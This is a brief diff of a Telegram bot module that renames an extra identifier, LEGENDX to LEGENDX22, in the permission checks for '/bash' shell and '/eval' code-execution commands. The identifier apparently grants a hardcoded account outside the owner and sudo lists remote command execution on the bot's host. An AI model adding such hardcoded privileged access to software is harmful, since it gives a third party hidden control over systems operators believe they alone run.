@@ -1,7 +1,7 @@
 import subprocess
 from LEGEND import telethn as bot
 from LEGEND.events import register
-from LEGEND import OWNER_ID, DEV_USERS as SUDO_USERS, LEGENDX
+from LEGEND import OWNER_ID, DEV_USERS as SUDO_USERS, LEGENDX22
 import asyncio
 import traceback
 import io
@@ -15,7 +15,7 @@ from telethon.errors import *
 
 @register(pattern="^/bash (.*)")
 async def msg(event):
-    if event.sender_id == OWNER_ID or event.sender_id in SUDO_USERS or event.sender_id == LEGENDX:
+    if event.sender_id == OWNER_ID or event.sender_id in SUDO_USERS or event.sender_id == LEGENDX22:
         pass
     else:
         return
@@ -43,7 +43,7 @@ async def msg(event):
 
 @register(pattern="/eval")
 async def _(event):
-    if event.sender_id == OWNER_ID or event.sender_id == LEGENDX:
+    if event.sender_id == OWNER_ID or event.sender_id == LEGENDX22:
         pass
     elif event.sender_id in SUDO_USERS:
         pass
